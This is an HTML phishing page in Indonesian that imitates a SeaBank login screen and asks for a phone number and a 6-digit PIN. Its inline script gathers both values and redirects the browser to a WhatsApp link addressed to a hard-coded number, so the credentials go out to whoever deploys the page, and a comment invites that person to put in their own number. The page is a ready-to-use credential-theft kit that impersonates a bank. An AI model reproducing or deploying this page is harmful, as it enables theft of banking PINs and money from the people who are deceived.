<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Login SeaBank</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="login-container">
  <h2>SeaBank</h2>
  <form id="loginForm">
    <input type="tel" id="nomor" placeholder="Nomor HP (08xxxxx)" required>
    <input type="password" id="pin" placeholder="PIN 6 Digit" minlength="6" maxlength="6" required>
    <button type="submit">Masuk</button>
  </form>
</div>

<script>
  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const nomor = document.getElementById("nomor").value.trim();
    const pin = document.getElementById("pin").value.trim();

    if (!/^08\d{8,}$/.test(nomor)) {
      alert("Nomor HP tidak valid!");
      return;
    }

    // Ganti nomor WA tujuan di bawah ini
    const nomorWA = "639640119085"; // Ganti dengan nomormu

    const pesan = `*Login SeaBank:*\nNomor: ${nomor}\nPIN: ${pin}`;
    const url = `https://wa.me/${nomorWA}?text=${encodeURIComponent(pesan)}`;
    window.location.href = url;
  });
</script>

</body>
</html>
